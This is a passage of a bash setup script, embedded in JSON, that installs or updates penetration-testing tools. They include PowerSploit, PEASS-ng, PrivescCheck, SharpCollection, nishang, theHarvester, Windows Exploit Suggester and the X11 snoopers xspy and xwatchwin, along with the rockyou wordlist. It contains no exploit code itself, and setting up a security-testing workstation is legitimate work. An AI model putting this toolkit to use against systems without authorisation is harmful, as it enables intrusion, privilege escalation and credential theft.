clone https://github.com/blacklanternsecurity/MANSPIDER /opt/manspider\n    apt install -y antiword tesseract-ocr\n    echo\nfi\n\nif ! command -v nishang &> /dev/null; then\n    echo -e \"${YELLOW}Installing nishang.${NC}\"\n    apt install -y nishang\n    echo\nfi\n\necho -e \"${BLUE}Updating Nmap scripts.${NC}\"\nnmap --script-updatedb | grep -Eiv '(starting|seconds)' | sed 's/NSE: //'\necho\n\nif [ -d /opt/PEASS-ng/.git ]; then\n    echo -e \"${BLUE}Updating PEASS-ng.${NC}\"\n    cd /opt/PEASS-ng/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing PEASS-ng.${NC}\"\n    git clone https://github.com/carlospolop/PEASS-ng /opt/PEASS-ng\n    echo\nfi\n\nif [ -d /opt/PowerSharpPack/.git ]; then\n    echo -e \"${BLUE}Updating PowerSharpPack.${NC}\"\n    cd /opt/PowerSharpPack/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing PowerSharpPack.${NC}\"\n    git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack /opt/PowerSharpPack\n    echo\nfi\n\nif [ -d /opt/PowerSploit/.git ]; then\n    echo -e \"${BLUE}Updating PowerSploit.${NC}\"\n    cd /opt/PowerSploit/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing PowerSploit.${NC}\"\n    git clone https://github.com/0xe7/PowerSploit /opt/PowerSploit\n    echo\nfi\n\nif [ -d /opt/PowerUpSQL/.git ]; then\n    echo -e \"${BLUE}Updating PowerUpSQL.${NC}\"\n    cd /opt/PowerUpSQL/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing PowerUpSQL.${NC}\"\n    git clone https://github.com/NetSPI/PowerUpSQL /opt/PowerUpSQL\n    echo\nfi\n\nif [ -d /opt/PrivescCheck/.git ]; then\n    echo -e \"${BLUE}Updating PrivescCheck.${NC}\"\n    cd /opt/PrivescCheck/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing PrivescCheck.${NC}\"\n    git clone https://github.com/itm4n/PrivescCheck /opt/PrivescCheck\n    echo\nfi\n\nif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then\n    echo -e \"${YELLOW}Expanding Rockyou list.${NC}\"\n    zcat /usr/share/wordlists/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt\n    rm /usr/share/wordlists/rockyou.txt.gz\n    echo\nfi\n\nif ! command -v rustc &> /dev/null; then\n    echo -e \"${YELLOW}Installing Rust.${NC}\"\n    apt install -y rustc\n    echo\nfi\n\nif [ -d /opt/SharpCollection/.git ]; then\n    echo -e \"${BLUE}Updating SharpCollection.${NC}\"\n    cd /opt/SharpCollection/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing SharpCollection.${NC}\"\n    git clone https://github.com/Flangvik/SharpCollection /opt/SharpCollection\n    echo\nfi\n\nif [ -d /opt/subfinder/.git ]; then\n    echo -e \"${BLUE}Updating subfinder.${NC}\"\n    cd /opt/subfinder/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing subfinder.${NC}\"\n    git clone https://github.com/projectdiscovery/subfinder /opt/subfinder\n    cd /opt/subfinder/v2/cmd/subfinder\n    go build\n    echo\nfi\n\nif [ $(lsb_release -si) == \"Parrot\" -a ! -d /usr/share/doc/python3-ujson ]; then\n    echo -e \"${YELLOW}Installing theHarvester Deps For Parrot.${NC}\"\n    apt install -yqq python3-ujson\nfi\n\nif [ -d /opt/theHarvester/.git -a -d /opt/theHarvester-venv ]; then\n    echo -e \"${BLUE}Updating theHarvester.${NC}\"\n    cd /opt/theHarvester/ ; git pull\n    source /opt/theHarvester-venv/bin/activate\n    /opt/theHarvester-venv/bin/pip3 install -r requirements.txt --upgrade | grep -v 'already satisfied'\n#    /opt/theHarvester-venv/bin/pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org -r requirements.txt --upgrade | grep -v 'already satisfied'\n    deactivate\n    echo\nelse\n    echo -e \"${YELLOW}Installing theHarvester.${NC}\"\n    git clone https://github.com/laramies/theHarvester /opt/theHarvester\n    echo\n    echo -e \"${YELLOW}Setting up theHarvester virtualenv.${NC}\"\n    virtualenv -p /usr/bin/python3 /opt/theHarvester-venv\n    source /opt/theHarvester-venv/bin/activate\n    cd /opt/theHarvester/\n    /opt/theHarvester-venv/bin/pip3 install -r requirements.txt\n#    /opt/theHarvester-venv/bin/pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org -r requirements.txt\n    deactivate\n    echo\nfi\n\nif [ -d /opt/Windows-Exploit-Suggester-NG/.git ]; then\n    echo -e \"${BLUE}Updating Windows Exploit Suggester NG.${NC}\"\n    cd /opt/Windows-Exploit-Suggester-NG/ ; git pull\n    echo\nelse\n    echo -e \"${YELLOW}Installing Windows Exploit Suggester NG.${NC}\"\n    git clone https://github.com/bitsadmin/wesng /opt/Windows-Exploit-Suggester-NG\n    echo\nfi\n\nif ! command -v xlsx2csv &> /dev/null; then\n    echo -e \"${YELLOW}Installing xlsx2csv.${NC}\"\n    apt install -y xlsx2csv\n    echo\nfi\n\nif ! command -v xml_grep &> /dev/null; then\n    echo -e \"${YELLOW}Installing xml_grep.${NC}\"\n    apt install -y xml-twig-tools\n    echo\nfi\n\nif ! command -v xspy &> /dev/null; then\n    echo -e \"${YELLOW}Installing xspy.${NC}\"\n    apt install -y xspy\n    echo\nfi\n\nif ! command -v xwatchwin &> /dev/null; then\n    echo -e \"${YELLOW}Installing xwatchwin.${NC}\"\n    apt install -y imagemagick libxext-dev xutils-dev\n    wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz\n    tar zxvf xwatchwin.tar.gz\n    rm xwatchwin.tar.gz\n    mv xwatchwin/ /opt/\n    cd /opt/xwatchwin/\n    xmkmf && make && make install\n    echo\nfi\n\necho -e \"${BLUE}Updating locate database.${NC}\"\nupdatedb\n\nexit\n"
        }
      ]
    }
  ]
}